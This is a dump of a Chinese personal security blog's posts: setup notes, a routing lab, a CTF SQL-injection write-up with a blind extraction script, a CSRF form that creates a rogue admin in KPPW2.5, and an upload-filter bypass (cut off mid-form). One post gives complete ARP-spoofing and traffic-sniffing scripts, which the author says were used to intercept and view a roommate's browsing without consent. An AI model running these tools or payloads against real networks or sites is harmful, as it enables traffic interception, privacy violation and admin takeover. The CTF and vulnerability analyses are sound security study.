Run &apos;apt list --upgradable&apos; to see them. W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt; W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt; W: Some index files failed to download. They have been ignored, or old ones used instead. 解决方法 apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6 再次执行就可以成功执行了","categories":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/categories/kali/"}],"tags":[{"name":"kali","slug":"kali","permalink":"http://yoursite.com/tags/kali/"}]},{"title":"eNSP静态路由配置","slug":"routestatic","date":"2018-03-18T15:32:19.761Z","updated":"2018-06-04T15:11:47.911Z","comments":true,"path":"2018/03/18/routestatic/","link":"","permalink":"http://yoursite.com/2018/03/18/routestatic/","excerpt":"eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础","text":"eNSP静态路由配置序这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础 课堂给出的拓扑如下 要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费 在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下R1 sy sysname r1 int e0/0/0 ip add 10.10.10.1 24 q int g0/0/0 ip add 2.2.2.2 30 q int g0/0/1 ip add 3.3.3.2 30 q R2 sy sysname r2 int e0/0/0 ip add 192.168.2.1 24 q int g0/0/0 ip add 2.2.2.1 30 1 int g0/0/1 ip add 1.1.1.1 30 q R3 sy sysname r3 int e0/0/0 ip add 172.16.2.1 24 q int g0/0/0 ip add 4.4.4.1 30 q int g0/0/1 ip add 3.3.3.1 24 q R4 sy sysname r4 int g0/0/1 ip add 1.1.1.2 30 q int g0/0/0 ip add 4.4.4.2 30 q 配置静态路由配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由 ip route-static 192.168.2.1 255.255.255.0 2.2.2.1 同时要在R2的路由表中添加一条PC2到PC1的静态路由 ip route-static 10.10.10.1 255.255.255.0 2.2.2.2 了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下 PC1到PC2之间的通信配置 R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1 R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2 测试PC1和PC2互通PC1到PC3之间的通信配置 R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1 R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2 测试PC1和PC3互通PC2到PC3之间的通信配置 R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2 R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1 R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2 R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1 测试PC2和PC3互通","categories":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/categories/网络基础/"}],"tags":[{"name":"网络基础","slug":"网络基础","permalink":"http://yoursite.com/tags/网络基础/"}]},{"title":"N1CTF2018 77777 writeup","slug":"N1CTF2018","date":"2018-03-12T02:53:49.460Z","updated":"2018-06-04T15:10:04.400Z","comments":true,"path":"2018/03/12/N1CTF2018/","link":"","permalink":"http://yoursite.com/2018/03/12/N1CTF2018/","excerpt":"N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧","text":"N1CTF2018 77777 writeup序之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧 题目：77777题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下 代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在http://47.97.168.223/#profile页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值 update users set points=&apos;post过来的flag和hi拼接后的结果&apos; 当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦 题目的第二个提示 the flag is `admin&apos;s password`:) 猜测数据库里有password字段,由此想到第二个思路，提交: flag=任意数字&amp;hi=任意数字 and (构造逻辑判断) 数据库语句变为: update users set points=任意数字 and （构造逻辑判断） 如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本 import requests import string list=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用 url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面 #read password #i=0 #while 1: # payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)} # html=requests.post(url=url,data=payload).content # if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break # print i # break # else: # i=i+1 #password length is 13 #read password i=0 for i in range(1,14): for j in list: payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)} html=requests.post(url=url,data=payload).content if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break print j break #flag is HE3L3LOCAT233 脚本通过1 and length(password) like %d来判断password长度为13，为真时页面points显示为1，否则为0 然后1 and substr(password,%d,1) like &#39;%s&#39;循环判断password内容，为真时页面的points值显示为1，否则为0 flag为N1CTF{HE3L3LOCAT233}","categories":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"centos7安装mysql","slug":"centos7mysql","date":"2018-02-27T14:34:28.576Z","updated":"2018-06-04T14:57:37.825Z","comments":true,"path":"2018/02/27/centos7mysql/","link":"","permalink":"http://yoursite.com/2018/02/27/centos7mysql/","excerpt":"centos7安装mysql由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql","text":"centos7安装mysql由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql1.卸载之前安装的MariaDB rpm -qa | grep mariadb(列出所有被安装的rpm package) rpm -e依次卸载 rpm -e mariadb-5.5.56-2.el7.x86_64 rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64 rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64 2.到mysql官网找到对应版本的mysql下载（本例中为mysql57-community-release-el7-11.noarch.rpm），上传至服务器 3.下载完毕后输入md5sum mysql57-community-release-el7-9.noarch.rpm生成MD5值并确保同官方网站上的MD5值相同。注意：建议运行此命令以确保文件无损坏 4.输入rpm -ivh mysql57-community-release-el7-9.noarch.rpm并按回车键进行安装YUM源RPM安装包 5.因上一步已添加新的YUM存储库，所以直接就可以用yum命令安装mysql了 yum install -y mysql-server 6.可以看到mysql已经成功安装","categories":[{"name":"其他","slug":"其他","permalink":"http://yoursite.com/categories/其他/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"arp协议分析&python编程实现arp欺骗抓图片","slug":"arpattack","date":"2018-01-12T14:24:48.076Z","updated":"2018-06-04T17:21:18.768Z","comments":true,"path":"2018/01/12/arpattack/","link":"","permalink":"http://yoursite.com/2018/01/12/arpattack/","excerpt":"arp协议分析&amp;python编程实现arp欺骗抓图片这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量","text":"arp协议分析&amp;python编程实现arp欺骗抓图片这篇文章分析了arp协议并且用python的scapy库实现了一次arp攻击去劫持室友的上网流量 实验环境1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中 2.python2.7.13，kali2.0自带 3.一个局域网和室友的电脑 4.kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持 选择kali支持的无线网卡可参考链接http://www.freebuf.com/articles/wireless/140065.html 不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错 arp协议研究在进行arp攻击之前，先来研究一下arp协议 arp协议简介：arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议 这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。因为在OSI七层模型中，ip地址在第三层网络层，传送的是数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系 arp协议数据包 arp数据包分为arp请求包和arp响应包，数据包格式如下图，arp数据包长度为28字节其中op段代表操作类型，当op为1代表发起arp请求，说明这是一个arp请求包，当op为2时代表发起arp响应，说明这是一个arp响应包，现在假设局域网的一台机器要上外网（比如百度），首先要与网关进行通讯，获取网关的物理地址后才能传送数据通过网关访问外网，这台机器会首先查看自己电脑的arp缓存表（缓存时间为120s）中是否有网关的物理地址，如果没有便会向局域网内的机器以广播的形式发送arp请求包询问网管的物理地址，请求包主要字段如下 op:1(op值为1说明这是一次arp请求) hwsrc：发送方MAC地址（即本机器MAC地址） psrc：发送方ip地址（即本机内网ip地址） hwdst：目标MAC地址（在这里为未知00：00：00：00：00：00） pdst：目标ip地址（即网关ip地址，一般为192.168.0.1/192.168.1.1） 局域网内所有机器接收此arp请求，如果发现请求的ip为自己的ip便会向请求机器发送arp响应，将自己的MAC地址带入arp响应包单播发送给请求的机器，arp响应包主要字段如下 op:2(op值为2说明这是一次arp响应) hwsrc：发送方MAC地址（即网关MAC地址） psrc：发送方ip地址（即网关ip地址） hwdst：目标MAC地址（为发起arp请求的机器的MAC地址） pdst：目标ip地址（为发起arp请求的机器的ip地址） 这样发起arp请求的机器从arp响应包里获取MAC地址并添加到本机arp缓存中，与网关进行通信，在这里要注意一点，在本机向网关发送arp请求的同时，网关也会向本机发送arp请求获取本机MAC地址，同时本机也会向网关发送arp响应，这时一个双向的过程，这里不再重复 接下来为了更清楚的理解，用wireshark抓包来观察一下arp请求包和响应包 选择抓包的网卡接口，在这选择wlan0，并向网关发起ping请求与网关通信，本机ip为192.168.0.106，网关ip为192.168.0.1在过滤窗口输入arp&amp;&amp;ip.addr==192.168.0.1将arp数据包过滤出来观察arp请求包和响应包是否和上述描述的一致，图中做出了详细标明 arp请求包arp响应包 arp欺骗上面描述完了arp协议，下面来说一下arp欺骗攻击，假设局域网内有三台机器 网关:192.168.0.1 受害者机器：192.168.0.108 本机kali：192.168.0.106 正常情况下，如果受害者和网关要进行通信，首先要使用arp协议进行对方的MAC地址获取，但是如果攻击者不断的向受害者发送arp响应包，告诉受害者网关的MAC地址为自己的MAC地址，包的大致内容如下 op:2(op值为2说明这是一次arp响应) hwsrc：发送方MAC地址（攻击者MAC地址） psrc：发送方ip地址（网关ip地址） hwdst：目标MAC地址（受害者MAC地址） pdst：目标ip地址（受害者ip地址） 在这里发送方ip是网关的ip，但是发送方MAC已经变为了攻击者（kali）的MAC地址，受害者不断的接收这个arp响应包，便会在自己的arp缓存中不断的更新错误的ip与MAC的对应关系，及网关的MAC为攻击者的MAC，由此攻击者的网卡便可以捕获到受害者到网关之间的流量，到现在实现了arp断网，受害者因为与错误的MAC地址进行通讯而上不了网，如果攻击者的机器开启了ip转发，便可以将从受害者截取到的流量转发出去给网关，实现arp欺骗，也称为中间人攻击 arp欺骗一般是双向欺骗，我们通过arp欺骗可以捕获到受害者到网关的流量，同样的我们可以向网关发送arp响应包欺骗网关受害者的MAC地址为自己的MAC地址，截获网关到受害者之间的流量，arp响应包大致如下 op:2(op值为2说明这是一次arp响应) hwsrc：发送方MAC地址（攻击者MAC地址） psrc：发送方ip地址（受害者ip地址） hwdst：目标MAC地址（网关MAC地址） pdst：目标ip地址（网关ip地址） 同样的网关在不断接受到此arp响应时也会不断的更新自己的arp缓存去建立错误的关系，我们的kali攻击机便可以双向的截获流量 用python实现arp攻击所需的python第三方库 scapy库：scapy是一个可用于网络嗅探的非常强大的第三方库。可以伪造，嗅探或发送网络数据包，这这里我们使用scapy库伪造arp响应包并发送,首先安装scapy库，kali默认自带 pip install scapy 模拟攻击环境,一个真实的局域网，就是我们寝室 自己的kali攻击机:192.168.0.106,装在vm虚拟机中，连接了RT3070型号的无线网卡 室友的电脑:192.168.0.108，连接同一路由器的无线网 网关：192.168.0.1 编写python代码：arpattack.py from scapy.all import *#导入scapy模块 from optparse import OptionParser#导入命令行参数处理模块optparse import sys def main(): usage=&quot;Usage: [-i interface] [-t targetip] [-g gatewayip]&quot; parser=OptionParser(usage) parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;)#-i 所选择的网卡，eth0或wlan0，存放在interface变量中 parser.add_option(&apos;-t&apos;,dest=&apos;targetip&apos;,help=&apos;select ip to spoof&apos;)#-t 要攻击的ip，存放在targetip变量中 parser.add_option(&apos;-g&apos;,dest=&apos;gatewayip&apos;,help=&apos;input gateway ip&apos;)#-g 网关ip，存放在gatewayip变量中 (options,args)=parser.parse_args() if options.interface and options.targetip and options.gatewayip: interface=options.interface tip=options.targetip gip=options.gatewayip spoof(interface,tip,gip)#将参数传给spoof函数 else: parser.print_help()#显示帮助 sys.exit(0) def spoof(interface,tip,gip):#获取命令行的输入实现arp攻击 localmac=get_if_hwaddr(interface)#get_if_hwaddr获取本地网卡MAC地址 tmac=getmacbyip(tip)#根据目标ip获取其MAC地址 gmac=getmacbyip(gip)#根据网关ip获取其MAC地址 ptarget=Ether(src=localmac,dst=tmac)/ARP(hwsrc=localmac,psrc=gip,hwdst=tmac,pdst=tip,op=2)#构造arp响应包，欺骗目标机器网关的MAC地址为本机MAC地址 pgateway=Ether(src=localmac,dst=gmac)/ARP(hwsrc=localmac,psrc=tip,hwdst=gmac,pdst=gip,op=2)#构造arp响应包，欺骗网关目标机器的MAC地址为本机MAC地址 try: while 1: sendp(ptarget,inter=2,iface=interface) print &quot;send arp reponse to target(%s),gateway(%s) macaddress is %s&quot;%(tip,gip,localmac) sendp(pgateway,inter=2,iface=interface) print &quot;send arp reponse to gateway(%s),target(%s) macaddress is %s&quot;%(gip,tip,localmac)#不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序 except KeyboardInterrupt: sys.exit(0) if __name__==&apos;__main__&apos;: main() 脚本使用到的scapy库中的几个函数 get_if_hwaddr(&quot;本地网卡名称（eth0/wlan0）&quot;) 根据所选择的本地网卡获取相应的本地网卡的MAC地址 getmacbyip（&quot;ip地址&quot;） 根据ip地址获取其MAC地址，使用该函数实际上使用了一次arp协议，可以用此函数获取网关和目标的MAC地址 ARP是构建ARP数据包的类，Ether用来构建以太网数据包，构造arp数据包并加上以太网头部 Ether(src=本地网卡MAC,dst=目标机器MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=目标机器MAC,pdst=目标机器ip,op=2) 构造发送给目标机器的arp数据包，并加上以太网头部，欺骗目标机器网关的MAC为本机的MAC Ether(src=本地网卡MAC,dst=网关MAC)/ARP(hwsrc=本地网卡MAC,psrc=网关ip,hwdst=网关MAC,pdst=网关ip,op=2) 构造发送给网关的arp数据包，并加上以太网头部，欺骗网关目标机器的MAC为本机的MAC sendp函数发送我们构造的arp数据包 sendp(数据包, inter=2, iface=网卡) sendp函数工作在网络的第二层 以上代码实现了类似于arpspoof工具的功能，使用方法，进入脚本目录，输入 python arpattack.py -h 查看脚本使用帮助 Usage: [-i interface] [-t targetip] [-g gatewayip] Options: -h, --help show this help message and exit -i INTERFACE select interface(input eth0 or wlan0 or more) -t TARGETIP select ip to spoof -g GATEWAYIP input gateway ip 所以我们这样输入可以双向的欺骗网关和目标机器完中间人攻击 python arpattack.py -i 网卡 -t 要攻击的目标的ip地址 -g 网关ip 输入 python arpattack.py -i wlan0 -t 192.168.0.8 -g 192.168.0.1 选择无线网卡wlan0的MAC地址去欺骗室友的电脑和网关路由器，如果我和室友都插了网线，就要选择eth0 运行脚本便会不断的向室友的电脑和网关发送arp响应包进行双向欺骗，效果如下室友电脑arp缓存路由器arp缓存这时我们截获了室友电脑和网关之间的流量，使其不能相互通信，完成了arp断网 echo &quot;1&quot;&gt;/proc/sys/net/ipv4/ip_forward 开启流量转发，这时室友和网关正常通讯，但是流量会经过我们的网卡 接下来用python编写代码查看室友电脑浏览的网页图片，其实不难，因为浏览图片一般都是向服务器发送一次请求图片的http请求，所以只需从经过我们网卡的流量中过滤tcp80端口的数据包（http协议），将数据包的头部层层去掉，最后便能得到应用层的http数据包，在利用正则表达式将http://*.jpg筛选出来即可知道室友请求了哪些图片，python的pcap库和dpkt库可以使我们很容易的得到电脑网卡流量中的http应用层数据包 apt-get install libpcap-dev pip install pypcap pip install dpkt 安装pcap库和dpkt库 pcap模块的pcap方法可以返回一个用来捕获网卡数据包的pcap对象 dpkt，一个数据包解析工具，可以解析离线/实时pcap数据包 python代码如下stealimg.py import pcap import dpkt import re import requests from PIL import Image from io import BytesIO from optparse import OptionParser import sys urllist=[] def main(): usage=&quot;Usage: [-i interface]&quot; parser=OptionParser(usage) parser.add_option(&apos;-i&apos;,dest=&apos;interface&apos;,help=&apos;select interface(input eth0 or wlan0 or more)&apos;) (options,args)=parser.parse_args() if options.interface: interface=options.interface pc=pcap.pcap(interface) pc.setfilter(&apos;tcp port 80&apos;) for ptime,pdata in pc: getimg(pdata) else: parser.print_help() sys.exit(0) def getimg(pdata): global urllist p=dpkt.ethernet.Ethernet(pdata) if p.data.__class__.__name__==&apos;IP&apos;: if p.data.data.__class__.__name__==&apos;TCP&apos;: if p.data.data.dport==80: pa=re.compile(r&apos;GET (.*?\\.jpg)&apos;)#|.*?\\.png|.*?\\.gif img=re.findall(pa,p.data.data.data) if img!=[]: lines=p.data.data.data.split(&apos;\\n&apos;) for line in lines: if &apos;Host:&apos; in line: url=&apos;http://&apos;+line.split(&apos;:&apos;)[-1].strip()+img[-1] if url not in urllist: urllist.append(url) if &apos;Referer:&apos; in p.data.data.data: for line in lines: if &apos;Referer:&apos; in line: referer=line.split(&apos;:&apos;)[-1].strip() print url r=requests.get(url,headers={&apos;Referer&apos;:referer}) img=Image.open(BytesIO(r.content)) img.show() else: r=requests.get(url) img=Image.open(BytesIO(r.content)) img.show() else: pass if __name__==&apos;__main__&apos;: main() 代码将pcap从本机网卡捕获到的完整的网络数据包使用dpkt库将其中封装的http应用层数据包提取出来，通过正则表达式将请求图片的http请求过滤出来，并在本机请求并输出，完成窥屏，效果如下 室友电脑浏览图片自己kali可以窥屏 注意一点，百度的图片爬取要在http请求头中加上Referer字段，否则会出现403禁止访问，代码只是简单的实现了窥屏的效果，还有着很多不足，不过通过这次学习可以对arp欺骗攻击有更深的理解","categories":[{"name":"python编程","slug":"python编程","permalink":"http://yoursite.com/categories/python编程/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"KPPW2.5XSS引起的CSRF","slug":"KPPW25xss","date":"2018-01-12T01:45:22.454Z","updated":"2018-06-04T15:08:43.891Z","comments":true,"path":"2018/01/12/KPPW25xss/","link":"","permalink":"http://yoursite.com/2018/01/12/KPPW25xss/","excerpt":"kppw2.5XSS漏洞分析与复现（可csrf）漏洞说明http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send 收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf","text":"kppw2.5XSS漏洞分析与复现（可csrf）漏洞说明http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send 收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf 漏洞利用http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send 收件人填写admin（网站管理员），向管理员提交私信，内容为我们构造的html代码 &lt;form action=&quot;http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid= &quot; method=&quot;post&quot;&gt; &lt;input type=hidden name=&quot;edituid&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[username]&quot; value=&quot;qianlan&quot;&gt; &lt;input type=hidden name=&quot;fds[truename]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[phone]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[qq]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[indus_pid]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[indus_id]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[birthday]&quot; value=&quot;&quot;&gt; &lt;input type=hidden name=&quot;fds[password]&quot; value=&quot;newadmin&quot;&gt; &lt;input type=hidden name=&quot;fds[email]&quot; value=&quot;x@q.c&quot;&gt; &lt;input type=hidden name=&quot;fds[group_id]&quot; value=&quot;1&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;is_submit&quot; value=&quot;1&quot;&gt; &lt;/form&gt; http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=这个url是后台管理员添加用户的url，我们构造表单，action的值设为这个url，写几个隐藏表单诱使管理员去点击提交，就会以管理员的身份去添加一个新的管理员，当然这不是网站管理员的意愿，而是我们的 提交完成后退出当前网站用户，模拟管理员登陆查看私信，可以看到一个按钮，单单一个按钮，看到的人总会想着去点一下，当然这个按钮可以构造的更具有吸引力当点击按钮过后，管理员就会在不知情的情况下发起添加用户的http请求去添加一个用户名为qianlan密码为newadmin的用户，当然这是我们构造的，看用户列表可以看到多了一个名为qianlan的用户，我们登陆一下可以成功进入后台，进行下一步的渗透","categories":[{"name":"web安全","slug":"web安全","permalink":"http://yoursite.com/categories/web安全/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"http://yoursite.com/tags/漏洞利用/"}]},{"title":"KPPW2.5文件上传导致远程代码执行","slug":"KPPW25fileupload","date":"2018-01-11T15:01:49.014Z","updated":"2018-06-04T15:04:56.343Z","comments":true,"path":"2018/01/11/KPPW25fileupload/","link":"","permalink":"http://yoursite.com/2018/01/11/KPPW25fileupload/","excerpt":"KPPW2.7文件上传导致远程代码执行漏洞复现测试环境和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell","text":"KPPW2.7文件上传导致远程代码执行漏洞复现测试环境和上一节的一样，同样是kpww2.5版本，此版本存在文件上传漏洞，攻击者可以上传php一句话木马拿下webshell ###上传点###漏洞分析 在control/ajax/upload.php中： $pathDir = setUploadPath($fileType, $objType); $upload = new keke_upload_class(S_ROOT.$pathDir ,$fileFormat,$maxSize); $savename = $upload-&gt;run( $filename , 1); 再来看run方法： function run($fileInput, $randName = 1) { if (isset ( $_FILES [$fileInput] )) { $fileArr = $_FILES [$fileInput]; if (is_array ( $fileArr [&apos;name&apos;] )) { .... } else { $this-&gt;getExt ( $fileArr [&apos;name&apos;] ); $this-&gt;setSavename (); if ($this-&gt;copyfile ( $fileArr, $randName )) { $this-&gt;returnArray [] = $this-&gt;returninfo; } else { $this-&gt;returninfo [&apos;error&apos;] = $this-&gt;errmsg (); $this-&gt;returnArray [] = $this-&gt;returninfo; } return $this-&gt;errno ? $this-&gt;errmsg () : $this-&gt;returnArray; } return false; } 在这段方法中，先是获取了$this-&gt;getExt ( $fileArr [‘name’] ); 文件后缀，这里没有什么问题，然后再生成上传后的随机名+后缀. 最后执行上传操作copyfile function copyfile($fileArray, $randName) { $this-&gt;returninfo = array (); $this-&gt;returninfo [&apos;name&apos;] = $fileArray [&apos;name&apos;]; if ($randName) { $this-&gt;returninfo [&apos;saveName&apos;] = $this-&gt;saveName; } else { $this-&gt;saveName = $this-&gt;returninfo [&apos;saveName&apos;] = $fileArray [&apos;name&apos;]; } $this-&gt;returninfo [&apos;size&apos;] = $fileArray [&apos;size&apos;]; $this-&gt;returninfo [&apos;type&apos;] = $fileArray [&apos;type&apos;]; if (! $this-&gt;validateFormat ()) { $this-&gt;errno = 11; return false; } if(!$this-&gt;fileFilter($fileArray [&quot;tmp_name&quot;],$this-&gt;ext)){ $this-&gt;errno = 21; return false; } if ($this-&gt;savePathFunc) { $savePathFunc = $this-&gt;savePathFunc; $this-&gt;savePath = $savePathFunc ( $this-&gt;saveName ); $this-&gt;returninfo [&apos;path&apos;] = $this-&gt;savePath; } $this-&gt;makeDirectory ( $this-&gt;savePath ); if (! @is_writable ( $this-&gt;savePath )) { @mkdir ( $this-&gt;savePath, 0777, true ); } if ($this-&gt;overwrite == 0 &amp;&amp; @file_exists ( $this-&gt;savePath . $this-&gt;saveName )) { $this-&gt;errno = 13; return false; } if ($this-&gt;maxSize != 0) { if ($fileArray [&quot;size&quot;] &gt; $this-&gt;maxSize) { $this-&gt;errno = 14; return false; } } if (! @copy ( $fileArray [&quot;tmp_name&quot;], $this-&gt;savePath . $this-&gt;saveName )) { $this-&gt;errno = $fileArray [&quot;error&quot;]; return false; } } 这里先做了$this-&gt;validateFormat (),根据文件名来获取后缀，再判断后缀是否合法： function validateFormat() { if (! is_array ( $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;ext ), $this-&gt;fileFormat ) || in_array ( strtolower ( $this-&gt;returninfo [&apos;type&apos;] ), $this-&gt;fileFormat )) return true; else return false; } 关键看这个条件：in_array ( strtolower ( $this-&gt;returninfo [&#39;type&#39;] ), $this-&gt;fileFormat ),这里判断type是否合法而且用了或操作，等于这边为true了，整个if条件就为true了， 而这个type我们可以改动的，只要抓包把Content-Disposition: form-data; name=&quot;name&quot;; filename=&quot;1.php&quot;Content-Type: 中的Content-Type设置成我们想要的值就可以绕过了。绕过了这个地方以为后面就一帆风顺了，但是还是上传不上去，继续看下面的一个操作$this-&gt;fileFilter($fileArray [“tmp_name”],$this-&gt;ext）这个操作实际上是根据文件头来确定文件的后缀，再检测后缀与之前的文件名获取的后缀是否一致。 这本来是一个很好的过滤方法，但开发人员又写错了： function fileFilter($path,$ext){ if(keke_file_class::get_file_type($path,$this-&gt;ext)==$ext){ return true; }else{ return false; } } static function get_file_type($file_path, $ext = &apos;&apos;) { $fp = fopen ( $file_path, &apos;r&apos; ); $bin = fread ( $fp, 2 ); fclose ( $fp ); $strInfo = @unpack ( &quot;C2chars&quot;, $bin ); $typeCode = intval ( $strInfo [&apos;chars1&apos;] . $strInfo [&apos;chars2&apos;] ); $fileType = &apos;unknown&apos;; $typeCode == &apos;3780&apos; &amp;&amp; $fileType = &quot;pdf&quot;; $typeCode == &apos;6787&apos; &amp;&amp; $fileType = &quot;swf&quot;; $typeCode == &apos;7784&apos; &amp;&amp; $fileType = &quot;midi&quot;; $typeCode == &apos;7790&apos; &amp;&amp; $fileType = &quot;exe&quot;; $ext == &apos;txt&apos; &amp;&amp; $fileType = &quot;txt&quot;; in_array ( $typeCode, array (&apos;8297&apos;, &apos;8075&apos; ) ) &amp;&amp; $fileType = $ext; if (in_array ( $typeCode, array (&apos;255216&apos;, &apos;7173&apos;, &apos;6677&apos;, &apos;13780&apos; ) )) { in_array ( $ext, array (&apos;jpg&apos;, &apos;gif&apos;, &apos;bmp&apos;, &apos;png&apos;, &apos;jpeg&apos; ) ) and $fileType = $ext or $fileType = &apos;jpg&apos;; } if ($typeCode == &apos;208207&apos;) { in_array ( $ext, array (&apos;wps&apos;, &apos;ppt&apos;, &apos;dot&apos;, &apos;xls&apos;, &apos;doc&apos;, &apos;docx&apos; ) ) and $fileType = $ext or $fileType = &apos;doc&apos;; } return $fileType; } 关键看这个操作：in_array ( $typeCode, array (‘8297’, ‘8075’ ) ) &amp;&amp; $fileType = $ext; 如果typecode 等于8297或者8075的时候，就会将filetype赋值为$ext,这样不就是饶过了之前的那个if判断。POC: 只需要将content-type 设置成jpg 再在上传的文件开头写上Ra 就可以成功绕过上传过滤。 （Ra 获取以后的code值就是8297）漏洞利用，构造上传页面 &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; 